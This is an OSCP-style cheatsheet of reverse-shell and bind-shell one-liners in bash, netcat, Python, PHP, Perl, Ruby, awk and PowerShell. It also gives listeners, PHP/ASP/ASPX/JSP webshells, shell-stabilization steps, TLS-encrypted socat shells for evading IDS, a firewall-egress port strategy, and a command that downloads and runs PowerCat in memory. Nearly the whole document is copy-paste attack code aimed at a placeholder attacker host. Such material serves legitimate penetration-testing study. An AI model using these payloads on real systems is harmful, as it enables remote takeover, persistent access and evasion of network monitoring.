# Reverse Shells and Listeners - OSCP Cheatsheet

> **Methodology and Cheatsheet Cross-References**:
> - Shells and Payloads Methodology: [[08-Shells-Payloads|08 - Shells and Payloads]]
> - Linux Commands Cheatsheet: [[🐧 linux-commands]]
> - Windows Commands Cheatsheet: [[🪟 windows-commands]]
> - MSFvenom Payload Generation: [[🐢 msfvenom]]

---

## Navigation Triage Matrix

| Operational Goal | Technique / Language | Quick Link |
|---|---|---|
| Configure listeners to catch incoming shells | Inbound Shell Listeners | [[#1. Inbound Shell Listeners]] |
| Execute reverse shell one-liners on Linux targets | Linux Reverse Shells | [[#2. Linux Reverse Shell One-Liners]] |
| Execute reverse shell one-liners on Windows targets | Windows Reverse Shells | [[#3. Windows Reverse Shell One-Liners]] |
| Connect to targets behind inbound-only restrictions | Bind Shells | [[#4. Bind Shell One-Liners (Inbound Only)]] |
| Deploy minimal webshells for command execution | Minimal Webshells | [[#5. Minimal Webshells (Command Stagers)]] |
| Upgrade raw netcat shells to fully interactive TTY | Shell Stabilization | [[#6. Shell Stabilization Protocols]] |
| Encrypt reverse shell traffic via SSL/TLS | Socat Encrypted Shells | [[#7. Socat Encrypted Shells (Evasion)]] |
| Bypass restrictive outbound egress firewalls | Egress Port Selection | [[#8. Firewall Egress Port Selection Strategy]] |
| Copy-paste high-yield reverse shell commands | Quick Reference | [[#9. Quick Reference Cheat Sheet]] |

---

## 1. Inbound Shell Listeners

Always initialize your listener on Kali before triggering any reverse shell payload:

### Standard Netcat Listener
```bash
# Standard listener: -l (listen), -v (verbose), -n (numeric IP), -p (port)
nc -lvnp [LPORT]
```

### Netcat Listener with rlwrap (Enables Arrow Keys and Command History)
```bash
# Wraps nc with GNU readline; enables arrow key navigation, Ctrl+R history, and line editing
rlwrap -cAr nc -lvnp [LPORT]
```

### Standard Socat Listener
```bash
socat -d -d TCP-LISTEN:[LPORT],reuseaddr STDOUT
```

### Socat Fully Interactive TTY Listener (Linux Targets Only)
Spawns a terminal that requires no secondary stabilization commands:
```bash
# Kali Listener (captures raw terminal state):
socat file:`tty`,raw,echo=0 TCP-LISTEN:[LPORT]
```

---

## 2. Linux Reverse Shell One-Liners

### Bash TCP Sockets

#### Standard Bash TCP Socket
```bash
bash -i >& /dev/tcp/[KALI_IP]/[LPORT] 0>&1
```

#### URL-Encoded Bash (For Web Parameter Injection)
```bash
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[KALI_IP]%2F[LPORT]%200%3E%261
```

#### Explicit File Descriptor Bash
```bash
exec 5<>/dev/tcp/[KALI_IP]/[LPORT]; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Netcat

#### Netcat with Execution Support (-e)
```bash
nc [KALI_IP] [LPORT] -e /bin/bash
nc [KALI_IP] [LPORT] -e /bin/sh
```

#### Netcat Traditional Named Pipe (Without -e)
Standard on Ubuntu and Debian distributions where `-e` is stripped for security:
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] [LPORT] > /tmp/f
```

### Python

#### Python 3 Standard One-Liner
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",[LPORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### Python 2 Alternative
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",[LPORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### PHP

#### PHP CLI One-Liner
```bash
php -r '$sock=fsockopen("[KALI_IP]",[LPORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### PHP proc_open Webshell Script
Save as `shell.php` and deploy to webroot:
```php
<?php
set_time_limit(0);
$ip = '[KALI_IP]';
$port = [LPORT];
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

### Additional Scripting Interpreters

#### Perl
```bash
perl -e 'use Socket;$i="[KALI_IP]";$p=[LPORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby
```bash
ruby -rsocket -e 'f=TCPSocket.open("[KALI_IP]",[LPORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Socat Linux Reverse Connect
Pairs with the Socat TTY listener on Kali:
```bash
socat TCP:[KALI_IP]:[LPORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

#### AWK (Minimalist and Embedded Systems)
Useful when standard shells (`bash`, `nc`, `python`) are restricted:
```bash
awk 'BEGIN {s="/inet/tcp/0/[KALI_IP]/[LPORT]";while(1){printf "> " |& s;if((s |& getline c)<=0)exit;while(c&&(c|&getline l)>0)print l|&s;close(c)}}'
```

#### Telnet (Legacy Environments)
```bash
# Named pipe method:
rm -f /tmp/p; mkfifo /tmp/p; telnet [KALI_IP] [LPORT] 0</tmp/p | /bin/sh 1>/tmp/p 2>&1; rm -f /tmp/p

# Dual-port method (requires two Netcat listeners on Kali: LPORT1 and LPORT2):
telnet [KALI_IP] [LPORT1] | /bin/sh | telnet [KALI_IP] [LPORT2]
```

---

## 3. Windows Reverse Shell One-Liners

### PowerShell TCPClient One-Liner (Standard Go-To)
```powershell
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('[KALI_IP]',[LPORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Base64 Encoded Command (Filter and Quote Evasion)
To avoid command-line parsing errors or special character corruption:

```bash
# 1. On Kali, encode the PowerShell command:
COMMAND='$client = New-Object System.Net.Sockets.TCPClient("[KALI_IP]",[LPORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
ENCODED=$(echo -n "$COMMAND" | iconv -t UTF-16LE | base64 -w 0)

# 2. Execute on Windows target:
powershell -nop -NonI -W Hidden -EncodedCommand [ENCODED_STRING]
```

### PowerShell Powercat In-Memory Execution
```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://[KALI_IP]/powercat.ps1');powercat -c [KALI_IP] -p [LPORT] -e cmd.exe"
```

### Python for Windows
```cmd
python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('[KALI_IP]',[LPORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe'])"
```

---

## 4. Bind Shell One-Liners (Inbound Only)

When the target network enforces strict outbound egress filtering that drops all connections back to Kali, execute a bind shell to open a local listener directly on the target machine:

### Netcat Bind Shell

#### Target Side (Opens Listening Socket)
```bash
# Target with -e support:
nc -lvnp [TARGET_PORT] -e /bin/bash

# Target without -e support (named pipe):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp [TARGET_PORT] > /tmp/f
```

#### Attacker Side (Connect from Kali)
```bash
nc -nv [TARGET_IP] [TARGET_PORT]
```

### Socat Bind Shell (Target Side)
```bash
socat TCP-LISTEN:[TARGET_PORT],fork EXEC:"/bin/bash -li",pty,stderr,setsid,sigint,sane
```

### Python Bind Shell (Target Side)
```python
python3 -c 'import socket,os;s=socket.socket();s.bind(("0.0.0.0",[TARGET_PORT]));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);os.system("/bin/sh")'
```

### Windows PowerShell Bind Shell (Target Side)
```powershell
powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',[TARGET_PORT]);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

---

## 5. Minimal Webshells (Command Stagers)

Deploy these minimal stagers when file uploads succeed but immediate interactive shells are blocked:

### PHP Minimal Webshells

#### GET Parameter Stager
```php
<?php system($_GET['cmd']); ?>
```
*Execution*: `http://[TARGET_IP]/shell.php?cmd=whoami`

#### POST Parameter Stager (Bypasses URL Query Logging)
```php
<?php system($_POST['cmd']); ?>
```
*Execution*:
```bash
curl -s -X POST http://[TARGET_IP]/shell.php -d "cmd=id"
```

### ASP Webshell (Classic IIS)
```asp
<%
Set obj = CreateObject("WScript.Shell")
Set output = obj.Exec("cmd.exe /c " & Request("cmd"))
Response.Write(output.StdOut.ReadAll())
%>
```

### ASPX Webshell (Modern IIS .NET Framework)
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        if (!string.IsNullOrEmpty(Request["cmd"])) {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c " + Request["cmd"];
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.UseShellExecute = false;
            p.Start();
            Response.Write(p.StandardOutput.ReadToEnd());
        }
    }
</script>
```

### JSP Webshell (Apache Tomcat and Java Servers)
```jsp
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
java.io.InputStream in = p.getInputStream();
int a = 0;
byte[] b = new byte[1024];
while ((a = in.read(b)) != -1) {
    out.println(new String(b, 0, a));
}
%>
```

---

## 6. Shell Stabilization Protocols

Upgrade raw Netcat sessions into fully interactive terminals with job control, arrow keys, and auto-completion:

### Method 1: Python PTY Spawn (Standard Procedure)
```bash
# 1. In reverse shell:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Set environment variables:
export TERM=xterm-256color
export SHELL=bash

# 3. Background process: Press Ctrl + Z

# 4. In Kali terminal:
stty raw -echo; fg
# (Press Enter twice)

# 5. Set terminal geometry to match Kali:
stty rows [ROWS] cols [COLUMNS]
```

### Method 2: Script Command (When Python is Absent)
```bash
# 1. In reverse shell:
/usr/bin/script -qc /bin/bash /dev/null

# 2. Follow standard backgrounding sequence:
# Ctrl + Z -> stty raw -echo; fg -> export TERM=xterm
```

### Method 3: Socat TTY Handshake (Zero Post-Stabilization)
```bash
# Kali Listener:
socat file:`tty`,raw,echo=0 TCP-LISTEN:[LPORT]

# Target Reverse Connect:
socat TCP:[KALI_IP]:[LPORT] EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## 7. Socat Encrypted Shells (Evasion)

Encrypts reverse shell communication over TLS/SSL to prevent network IDS/IPS inspection:

### 1. Generate SSL Certificate on Kali
```bash
openssl req -newkey rsa:2048 -nodes -keyout /tmp/encrypt.key -x509 -days 30 -out /tmp/encrypt.crt
cat /tmp/encrypt.key /tmp/encrypt.crt > /tmp/encrypt.pem
```

### 2. Start Encrypted Socat Listener on Kali
```bash
socat OPENSSL-LISTEN:[LPORT],cert=/tmp/encrypt.pem,verify=0 -
```

### 3. Connect from Target
```bash
socat OPENSSL:[KALI_IP]:[LPORT],verify=0 EXEC:/bin/bash
```

---

## 8. Firewall Egress Port Selection Strategy

Many exam and enterprise targets enforce outbound firewall filtering on non-standard ports (e.g., blocking 4444, 9001, 1337):

| Egress Port | Traffic Protocol | Likelihood of Outbound Clearance |
|---|---|---|
| **Port 80** | HTTP | ✅ Extremely high (standard web browsing) |
| **Port 443** | HTTPS | ✅ Highest (encrypted traffic, rarely inspected) |
| **Port 53** | DNS | ✅ High (frequently permitted for resolution) |
| **Port 8080** | HTTP Alternate | ⚠️ Moderate (common dev proxy port) |
| **Port 4444 / 9001** | Non-standard | ❌ Low (frequently blocked by egress firewalls) |

> 💡 **Best Practice**: Default your listeners to `443` or `80` to minimize firewall interference during exploitation.

---

## 9. Quick Reference Cheat Sheet

```bash
# 1. Listeners
nc -lvnp 443
rlwrap -cAr nc -lvnp 443
socat file:`tty`,raw,echo=0 TCP-LISTEN:443

# 2. Bash Reverse Shell
bash -i >& /dev/tcp/[KALI_IP]/443 0>&1

# 3. Netcat Traditional
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [KALI_IP] 443 > /tmp/f

# 4. Python 3 Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[KALI_IP]",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# 5. PowerShell TCPClient
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('[KALI_IP]',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# 6. Shell Stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z -> stty raw -echo; fg -> export TERM=xterm-256color
```
